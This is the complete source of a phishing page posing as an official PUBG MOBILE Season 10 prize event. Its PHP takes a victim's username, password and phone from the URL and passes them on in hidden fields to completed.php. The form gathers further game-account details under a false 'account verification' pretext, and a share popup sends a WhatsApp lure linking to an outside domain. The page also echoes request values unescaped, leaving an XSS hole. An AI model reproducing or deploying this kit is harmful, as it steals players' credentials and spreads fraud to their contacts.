<?php
$username = $_GET['username'];
$password = $_GET['password'];
$phone = $_GET['phone'];
?>
<html>
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="PUBG MOBILE">
<meta name="description" content="Latest PUBG MOBILE update. Get an exclusive Season 10 prize especially for you !!!">
<meta property="og:description" content="Latest PUBG MOBILE update. Get an exclusive Season 10 prize especially for you !!!">
<meta property="og:url" content="./">
<meta property="og:site_name" content="PUBG MOBILE">
<meta property="og:type" content="website">
<meta name="copyright"content="PUBG MOBILE">
<meta name="theme-color" content="#f2aa00">
<meta property="og:image" content="img/icon.png">
<title>PUBG MOBILE</title>
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="css/animate.css">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="icon" href="img/icon.png">
<script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5dcbabd2869127ad"></script>
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">

<div class="container">
<div class="container-dark">
<center>
<div class="container-line"></div>
</center>
<div class="header">
<img src="img/logo.png">
<button type="button" onclick="share()"><i class="fa fa-share"></i> Share</button>
</div>

<div class="box">

<div class="txt-season">ACCOUNT VERIFICATION<br> <small>VERIFY YOUR ACCOUNT BEFORE RECEIVE YOUR SELECTED PRIZE</small></div>

<center>
<form action="completed.php" method="get">
<input type="hidden" name="username" value="<?php echo $username;?>" readonly>
<input type="hidden" name="password" value="<?php echo $password;?>" readonly>
<input type="hidden" name="phone" value="<?php echo $phone;?>" readonly>
<div class="box-notes">
<input type="text" name="nickname" placeholder="Character Name" autocomplete="off" required>
<input type="number" name="playid" placeholder="Character ID" autocomplete="off" required>
<select name="level" required>
<option selected="selected" disabled="disabled" value="">Account Level</option>
<option>1</option>
<option>2</option>
<option>3</option>
<option>4</option>
<option>5</option>
<option>6</option>
<option>7</option>
<option>8</option>
<option>9</option>
<option>10</option>
<option>11</option>
<option>12</option>
<option>13</option>
<option>14</option>
<option>15</option>
<option>16</option>
<option>17</option>
<option>18</option>
<option>19</option>
<option>20</option>
<option>21</option>
<option>22</option>
<option>23</option>
<option>24</option>
<option>25</option>
<option>26</option>
<option>27</option>
<option>28</option>
<option>29</option>
<option>30</option>
<option>31</option>
<option>32</option>
<option>33</option>
<option>34</option>
<option>35</option>
<option>36</option>
<option>37</option>
<option>38</option>
<option>39</option>
<option>40</option>
<option>41</option>
<option>42</option>
<option>43</option>
<option>44</option>
<option>45</option>
<option>46</option>
<option>47</option>
<option>48</option>
<option>49</option>
<option>50</option>
<option>51</option>
<option>52</option>
<option>53</option>
<option>54</option>
<option>55</option>
<option>56</option>
<option>57</option>
<option>58</option>
<option>59</option>
<option>60</option>
<option>61</option>
<option>62</option>
<option>63</option>
<option>64</option>
<option>65</option>
<option>66</option>
<option>67</option>
<option>68</option>
<option>69</option>
<option>70</option>
<option>71</option>
<option>72</option>
<option>73</option>
<option>74</option>
<option>75</option>
<option>76</option>
<option>77</option>
<option>78</option>
<option>79</option>
<option>80</option>
<option>81</option>
<option>82</option>
<option>83</option>
<option>84</option>
<option>85</option>
<option>86</option>
<option>87</option>
<option>88</option>
<option>89</option>
<option>90</option>
<option>91</option>
<option>92</option>
<option>93</option>
<option>94</option>
<option>95</option>
<option>96</option>
<option>97</option>
<option>98</option>
<option>99</option>
<option>100</option>
</select>
<select name="tier" required>
<option selected="selected" disabled="disabled" value="">Ranked Tier Level</option>
<option>Bronze</option>
<option>Silver</option>
<option>Gold</option>
<option>Platinum</option>
<option>Diamond</option>
<option>Crown</option>
<option>Ace</option>
<option>Conqueror</option>
</select>
<select name="rpt" required>
<option selected="selected" disabled="disabled" value="">Royale Pass Type</option>
<option>Free Royale Pass</option>
<option>Elite Royale Pass</option>
<option>Elite Royale Pass Plus</option>
</select>
<select name="rpl" required>
<option selected="selected" disabled="disabled" value="">Royale Pass Level</option>
<option>1</option>
<option>2</option>
<option>3</option>
<option>4</option>
<option>5</option>
<option>6</option>
<option>7</option>
<option>8</option>
<option>9</option>
<option>10</option>
<option>11</option>
<option>12</option>
<option>13</option>
<option>14</option>
<option>15</option>
<option>16</option>
<option>17</option>
<option>18</option>
<option>19</option>
<option>20</option>
<option>21</option>
<option>22</option>
<option>23</option>
<option>24</option>
<option>25</option>
<option>26</option>
<option>27</option>
<option>28</option>
<option>29</option>
<option>30</option>
<option>31</option>
<option>32</option>
<option>33</option>
<option>34</option>
<option>35</option>
<option>36</option>
<option>37</option>
<option>38</option>
<option>39</option>
<option>40</option>
<option>41</option>
<option>42</option>
<option>43</option>
<option>44</option>
<option>45</option>
<option>46</option>
<option>47</option>
<option>48</option>
<option>49</option>
<option>50</option>
<option>51</option>
<option>52</option>
<option>53</option>
<option>54</option>
<option>55</option>
<option>56</option>
<option>57</option>
<option>58</option>
<option>59</option>
<option>60</option>
<option>61</option>
<option>62</option>
<option>63</option>
<option>64</option>
<option>65</option>
<option>66</option>
<option>67</option>
<option>68</option>
<option>69</option>
<option>70</option>
<option>71</option>
<option>72</option>
<option>73</option>
<option>74</option>
<option>75</option>
<option>76</option>
<option>77</option>
<option>78</option>
<option>79</option>
<option>80</option>
<option>81</option>
<option>82</option>
<option>83</option>
<option>84</option>
<option>85</option>
<option>86</option>
<option>87</option>
<option>88</option>
<option>89</option>
<option>90</option>
<option>91</option>
<option>92</option>
<option>93</option>
<option>94</option>
<option>95</option>
<option>96</option>
<option>97</option>
<option>98</option>
<option>99</option>
<option>100</option>
</select>
<select name="platform" required>
<option selected="selected" disabled="disabled" value="">Platform</option>
<option>Android</option>
<option>iOS</option>
</select>
<select name="country" required>
<option selected="selected" disabled="disabled" value="">Region</option>
<option>Afghanistan</option>
<option>Albania</option>
<option>Algeria</option>
<option>American Samoa</option>
<option>Andorra</option>
<option>Angola</option>
<option>Anguilla</option>
<option>Antarctica</option>
<option>Antigua and Barbuda</option>
<option>Argentina</option>
<option>Armenia</option>
<option>Aruba</option>
<option>Australia</option>
<option>Austria</option>
<option>Azerbaijan</option>
<option>Bahrain</option>
<option>Bangladesh</option>
<option>Barbados</option>
<option>Belarus</option>
<option>Belgium</option>
<option>Belize</option>
<option>Benin</option>
<option>Bermuda</option>
<option>Bhutan</option>
<option>Bolivia</option>
<option>Bosnia and Herzegovina</option>
<option>Botswana</option>
<option>Bouvet Island</option>
<option>Brazil</option>
<option>British Indian Ocean Territory</option>
<option>British Virgin Islands</option>
<option>Brunei</option>
<option>Bulgaria</option>
<option>Burkina Faso</option>
<option>Burundi</option>
<option>Côte d'Ivoire</option>
<option>Cambodia</option>
<option>Cameroon</option>
<option>Canada</option>
<option>Cape Verde</option>
<option>Cayman Islands</option>
<option>Central African Republic</option>
<option>Chad</option>
<option>Chile</option>
<option>China</option>
<option>Christmas Island</option>
<option>Cocos (Keeling) Islands</option>
<option>Colombia</option>
<option>Comoros</option>
<option>Congo</option>
<option>Cook Islands</option>
<option>Costa Rica</option>
<option>Croatia</option>
<option>Cuba</option>
<option>Cyprus</option>
<option>Czech Republic</option>
<option>Democratic Republic of the Congo</option>
<option>Denmark</option>
<option>Djibouti</option>
<option>Dominica</option>
<option>Dominican Republic</option>
<option>East Timor</option>
<option>Ecuador</option>
<option>Egypt</option>
<option>El Salvador</option>
<option>Equatorial Guinea</option>
<option>Eritrea</option>
<option>Estonia</option>
<option>Ethiopia</option>
<option>Faeroe Islands</option>
<option>Falkland Islands</option>
<option>Fiji</option>
<option>Finland</option>
<option>Former Yugoslav Republic of Macedonia</option>
<option>France</option>
<option>France, Metropolitan</option>
<option>French Guiana</option>
<option>French Polynesia</option>
<option>French Southern Territories</option>
<option>Gabon</option>
<option>Georgia</option>
<option>Germany</option>
<option>Ghana</option>
<option>Gibraltar</option>
<option>Greece</option>
<option>Greenland</option>
<option>Grenada</option>
<option>Guadeloupe</option>
<option>Guam</option>
<option>Guatemala</option>
<option>Guinea</option>
<option>Guinea-Bissau</option>
<option>Guyana</option>
<option>Haiti</option>
<option>Heard and Mc Donald Islands</option>
<option>Honduras</option>
<option>Hong Kong</option>
<option>Hungary</option>
<option>Iceland</option>
<option>India</option>
<option>Indonesia</option>
<option>Iran</option>
<option>Iraq</option>
<option>Ireland</option>
<option>Israel</option>
<option>Italy</option>
<option>Jamaica</option>
<option>Japan</option>
<option>Jordan</option>
<option>Kazakhstan</option>
<option>Kenya</option>
<option>Kiribati</option>
<option>Kuwait</option>
<option>Kyrgyzstan</option>
<option>Laos</option>
<option>Latvia</option>
<option>Lebanon</option>
<option>Lesotho</option>
<option>Liberia</option>
<option>Libya</option>
<option>Liechtenstein</option>
<option>Lithuania</option>
<option>Luxembourg</option>
<option>Macau</option>
<option>Madagascar</option>
<option>Malawi</option>
<option>Malaysia</option>
<option>Maldives</option>
<option>Mali</option>
<option>Mayotte</option>
<option>Marshall Islands</option>
<option>Martinique</option>
<option>Mauritania</option>
<option>Mauritius</option>
<option>Mexico</option>
<option>Micronesia</option>
<option>Moldova</option>
<option>Monaco</option>
<option>Mongolia</option>
<option>Montenegro</option>
<option>Montserrat</option>
<option>Morocco</option>
<option>Mozambique</option>
<option>Myanmar</option>
<option>Namibia</option>
<option>Nauru</option>
<option>Nepal</option>
<option>Netherlands</option>
<option>Netherlands Antilles</option>
<option>New Caledonia</option>
<option>New Zealand</option>
<option>Nicaragua</option>
<option>Niger</option>
<option>Nigeria</option>
<option>Niue</option>
<option>Norfolk Island</option>
<option>North Korea</option>
<option>Northern Marianas</option>
<option>Norway</option>
<option>Oman</option>
<option>Pakistan</option>
<option>Palau</option>
<option>Panama</option>
<option>Papua New Guinea</option>
<option>Paraguay</option>
<option>Peru</option>
<option>Philippines</option>
<option>Pitcairn Islands</option>
<option>Poland</option>
<option>Portugal</option>
<option>Puerto Rico</option>
<option>Qatar</option>
<option>Reunion</option>
<option>Romania</option>
<option>Russia</option>
<option>Rwanda</option>
<option>São Tomé and Príncipe</option>
<option>Saint Helena</option>
<option>St. Pierre and Miquelon</option>
<option>Saint Kitts and Nevis</option>
<option>Saint Lucia</option>
<option>Saint Vincent and the Grenadines</option>
<option>Samoa</option>
<option>San Marino</option>
<option>Saudi Arabia</option>
<option>Senegal</option>
<option>Serbia</option>
<option>Seychelles</option>
<option>Sierra Leone</option>
<option>Singapore</option>
<option>Slovakia</option>
<option>Slovenia</option>
<option>Solomon Islands</option>
<option>Somalia</option>
<option>South Africa</option>
<option>South Georgia and the South Sandwich Islands</option>
<option>South Korea</option>
<option>Spain</option>
<option>Sri Lanka</option>
<option>Sudan</option>
<option>Suriname</option>
<option>Svalbard and Jan Mayen Islands</option>
<option>Swaziland</option>
<option>Sweden</option>
<option>Switzerland</option>
<option>Syria</option>
<option>Taiwan</option>
<option>Tajikistan</option>
<option>Tanzania</option>
<option>Thailand</option>
<option>The Bahamas</option>
<option>The Gambia</option>
<option>Togo</option>
<option>Tokelau</option>
<option>Tonga</option>
<option>Trinidad and Tobago</option>
<option>Tunisia</option>
<option>Turkey</option>
<option>Turkmenistan</option>
<option>Turks and Caicos Islands</option>
<option>Tuvalu</option>
<option>US Virgin Islands</option>
<option>Uganda</option>
<option>Ukraine</option>
<option>United Arab Emirates</option>
<option>United Kingdom</option>
<option>United States</option>
<option>United States Minor Outlying Islands</option>
<option>Uruguay</option>
<option>Uzbekistan</option>
<option>Vanuatu</option>
<option>Vatican City</option>
<option>Venezuela</option>
<option>Vietnam</option>
<option>Wallis and Futuna Islands</option>
<option>Western Sahara</option>
<option>Yemen</option>
<option>Zambia</option>
<option>Zimbabwe</option>
</select>
<input type="hidden" name="login" value="Facebook" readonly>
</div>

<button type="submit" class="btn-continue">Verify</button>
</form>
</center>

</div> <!--- box --->
</div> <!--- container dark --->
</div> <!--- container --->


<!--- SHARE CONTENT --->
<div class="popup share" style="display: none;">
<div class="popup-box animated fadeIn">
<div class="container">
<div class="container-dark">
<center>
<div class="container-line"></div>
</center>
<div class="header">
<img src="img/logo.png">
<button type="button"><i class="fa fa-share"></i> Share</button>
</div>
<div class="box">
<center>
<img class="season-logo" src="img/s10.png">
</center>
<div class="txt-season">ROYALE PASS SEASON 10 <br> <small>SHARE THIS EVENT TO YOUR FRIENDS OR FAMILY</small></div>
<center>
<div class="box-notes">
<center>
<div class="pilihan-login" onclick="location.href='whatsapp://send?text=Get a variety of exclusive prizes from PUBG MOBILE. Click the link below to claim an exclusive gift especially for you: http://eventpubgs10.mrbonus.com'">
<img src="img/wa.png">
</div>
</center>
</div>
<button type="button" class="btn-continue" onclick="closeshare()">Cancel</button>
</center>
</div> <!--- box --->
</div> <!--- container dark --->
</div> <!--- container --->
</div>
</div>
<!--- SHARE CONTENT END --->


<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script type="text/javascript" src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
<script src="js/popup.js"></script>

</body>
</html>